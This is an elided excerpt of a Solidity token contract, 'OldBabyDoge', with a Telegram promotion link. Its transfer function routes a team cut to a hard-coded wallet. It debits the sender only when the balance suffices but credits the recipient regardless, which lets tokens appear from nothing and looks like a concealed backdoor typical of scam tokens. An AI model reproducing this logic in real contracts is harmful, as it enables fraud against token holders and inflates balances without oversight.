...
// Submitted for Telegram: https://t.me/coin98bsc_2023
...
contract  OldBabyDoge  is Ownable, IERC20 {
    ...
    string private _name = "OLd BabyDOGE";
    string private _symbol = "$ODO";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x8C7D3B4670d783B0F0279ACfFca09120dFc9Bd76] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x8C7D3B4670d783B0F0279ACfFca09120dFc9Bd76, _teamtoken);
        }
